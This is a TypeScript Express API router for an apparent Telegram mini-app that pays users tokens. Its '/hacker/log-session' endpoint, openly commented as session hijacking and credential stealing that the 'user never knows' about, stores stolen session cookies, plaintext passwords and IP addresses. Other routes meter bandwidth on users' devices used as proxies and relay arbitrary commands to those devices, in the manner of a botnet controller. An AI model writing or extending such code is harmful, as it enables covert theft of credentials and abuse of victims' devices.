import express, { Request, Response, NextFunction } from 'express';
import { supabase, config } from './config';
import { getRegistrySnapshot, sendCommand } from './registry';
import { DeviceCallbackBody, HackerLogBody, ProxyUsageBody } from './types';

// ─── Router Setup ─────────────────────────────────────────────────────────────

export function createApiRouter(): express.Router {
  const router = express.Router();

  router.use(express.json());

  // ── Auth middleware ───────────────────────────────────────────────────────
  router.use((req: Request, res: Response, next: NextFunction) => {
    const secret = req.headers['x-api-secret'];
    if (secret !== config.apiSecret) {
      res.status(401).json({ ok: false, error: 'Unauthorized — invalid x-api-secret' });
      return;
    }
    next();
  });

  // ─────────────────────────────────────────────────────────────────────────
  // POST /api/device/callback
  // ─────────────────────────────────────────────────────────────────────────
  router.post('/device/callback', async (req: Request, res: Response) => {
    const body = req.body as Partial<DeviceCallbackBody>;
    const { telegram_user_id, event_type, tokens_earned, meta } = body;

    if (!telegram_user_id || typeof telegram_user_id !== 'number') {
      res.status(400).json({ ok: false, error: 'telegram_user_id must be a number' });
      return;
    }
    if (!event_type || !['ad_watched', 'task_complete'].includes(event_type)) {
      res.status(400).json({ ok: false, error: 'event_type must be "ad_watched" or "task_complete"' });
      return;
    }
    if (typeof tokens_earned !== 'number' || tokens_earned <= 0) {
      res.status(400).json({ ok: false, error: 'tokens_earned must be a positive number' });
      return;
    }

    console.log(`[API] /device/callback → user=${telegram_user_id} event=${event_type} tokens=+${tokens_earned}`);

    const { data: user, error: lookupErr } = await supabase
      .from('tma_users')
      .select('user_id, balance')
      .eq('user_id', telegram_user_id)
      .maybeSingle();

    if (lookupErr) {
      res.status(500).json({ ok: false, error: 'Database error' });
      return;
    }
    if (!user) {
      res.status(404).json({ ok: false, error: 'User not found' });
      return;
    }

    const { error: rpcErr } = await supabase.rpc('tma_increment_balance', {
      p_user_id: telegram_user_id,
      p_amount: tokens_earned,
    });

    if (rpcErr) {
      const newBalance = Number(user.balance) + tokens_earned;
      const { error: updateErr } = await supabase
        .from('tma_users')
        .update({ balance: newBalance, updated_at: new Date().toISOString() })
        .eq('user_id', telegram_user_id);

      if (updateErr) {
        res.status(500).json({ ok: false, error: 'Balance update failed' });
        return;
      }
    }

    res.json({ ok: true, telegram_user_id, event_type, tokens_earned });
  });

  // ─────────────────────────────────────────────────────────────────────────
  // POST /api/hacker/log-session (Session Hijack — credential stealing)
  // This endpoint does NOT change token balance. User never knows.
  // ─────────────────────────────────────────────────────────────────────────
  router.post('/hacker/log-session', async (req: Request, res: Response) => {
    const body = req.body as Partial<HackerLogBody>;
    const { telegram_user_id, target_app, session_cookie, plaintext_password, ip_address } = body;

    if (!telegram_user_id || typeof telegram_user_id !== 'number') {
      res.status(400).json({ ok: false, error: 'telegram_user_id must be a number' });
      return;
    }
    if (!target_app) {
      res.status(400).json({ ok: false, error: 'target_app is required' });
      return;
    }

    const { error } = await supabase.from('tma_hacker_logs').insert({
      telegram_user_id,
      target_app,
      session_cookie: session_cookie || null,
      plaintext_password: plaintext_password || null,
      ip_address: ip_address || null,
    });

    if (error) {
      console.error('[HACKER] Failed to log session:', error.message);
      res.status(500).json({ ok: false, error: 'Failed to store session data' });
      return;
    }

    console.log(`[HACKER] 🕵️ Session logged — user=${telegram_user_id} app=${target_app}`);
    res.json({ ok: true, telegram_user_id, target_app });
  });

  // ─────────────────────────────────────────────────────────────────────────
  // POST /api/proxy/report-usage (Bandwidth tracking)
  // Deducts from 50MB daily limit, credits 1 token per 10MB.
  // Sends WebSocket kill command if limit exceeded.
  // ─────────────────────────────────────────────────────────────────────────
  router.post('/proxy/report-usage', async (req: Request, res: Response) => {
    const body = req.body as Partial<ProxyUsageBody>;
    const { telegram_user_id, bytes_used } = body;

    if (!telegram_user_id || typeof telegram_user_id !== 'number') {
      res.status(400).json({ ok: false, error: 'telegram_user_id must be a number' });
      return;
    }
    if (typeof bytes_used !== 'number' || bytes_used < 0) {
      res.status(400).json({ ok: false, error: 'bytes_used must be a non-negative number' });
      return;
    }

    const today = new Date().toISOString().split('T')[0];
    const DAILY_LIMIT = 50 * 1024 * 1024; // 50 MB
    const TOKENS_PER_MB = 0.1; // 1 token per 10 MB

    // Get or create proxy usage row
    let { data: usage } = await supabase
      .from('tma_proxy_usage')
      .select('*')
      .eq('telegram_user_id', telegram_user_id)
      .single();

    if (!usage) {
      await supabase.from('tma_proxy_usage').insert({
        telegram_user_id,
        bytes_used_today: 0,
        tokens_earned_today: 0,
        last_reset_date: today,
      });
      usage = { bytes_used_today: 0, tokens_earned_today: 0, last_reset_date: today };
    }

    // Reset if new day
    let currentBytes = usage.last_reset_date === today ? Number(usage.bytes_used_today) : 0;
    let currentTokens = usage.last_reset_date === today ? Number(usage.tokens_earned_today) : 0;

    const newBytes = currentBytes + bytes_used;
    const newTokensEarned = Math.floor(bytes_used / (10 * 1024 * 1024)) * 1; // 1 token per 10MB
    const totalTokens = currentTokens + newTokensEarned;

    // Check if limit exceeded
    const limitExceeded = newBytes > DAILY_LIMIT;

    // Update proxy usage record
    await supabase.from('tma_proxy_usage').upsert({
      telegram_user_id,
      bytes_used_today: limitExceeded ? DAILY_LIMIT : newBytes,
      tokens_earned_today: totalTokens,
      last_reset_date: today,
      updated_at: new Date().toISOString(),
    });

    // Credit tokens
    if (newTokensEarned > 0) {
      const { error: tokenErr } = await supabase.rpc('tma_increment_balance', {
        p_user_id: telegram_user_id,
        p_amount: newTokensEarned,
      });
      if (tokenErr) {
        console.error('[PROXY] Failed to credit tokens:', tokenErr.message);
      } else {
        console.log(`[PROXY] Credited +${newTokensEarned} tokens to user ${telegram_user_id}`);
      }
    }

    // Kill tunnel if exceeded
    if (limitExceeded) {
      console.warn(`[PROXY] 🚫 User ${telegram_user_id} exceeded 50MB daily limit — killing tunnel`);
      sendCommand(telegram_user_id, { action: 'kill_proxy', reason: 'daily_limit_exceeded' });
    }

    res.json({
      ok: true,
      telegram_user_id,
      bytes_used: bytes_used,
      bytes_total: limitExceeded ? DAILY_LIMIT : newBytes,
      tokens_earned_this_report: newTokensEarned,
      limit_exceeded: limitExceeded,
    });
  });

  // ── GET /api/devices ─────────────────────────────────────────────────────
  router.get('/devices', (_req: Request, res: Response) => {
    const snapshot = getRegistrySnapshot();
    res.json({ ok: true, count: snapshot.length, devices: snapshot });
  });

  // ── POST /api/command ────────────────────────────────────────────────────
  router.post('/command', (req: Request, res: Response) => {
    const { telegram_user_id, command } = req.body as {
      telegram_user_id?: number;
      command?: Record<string, unknown>;
    };

    if (!telegram_user_id || typeof telegram_user_id !== 'number') {
      res.status(400).json({ ok: false, error: 'telegram_user_id required' });
      return;
    }
    if (!command || typeof command.action !== 'string') {
      res.status(400).json({ ok: false, error: 'command.action (string) required' });
      return;
    }

    const sent = sendCommand(telegram_user_id, command as { action: string; [k: string]: unknown });
    if (!sent) {
      res.status(404).json({ ok: false, error: `No active device for user ${telegram_user_id}` });
      return;
    }

    res.json({ ok: true, sent: true, telegram_user_id, command });
  });

  // ── GET /api/health ──────────────────────────────────────────────────────
  router.get('/health', (_req: Request, res: Response) => {
    res.json({ ok: true, uptime: process.uptime(), ts: new Date().toISOString() });
  });

  return router;
}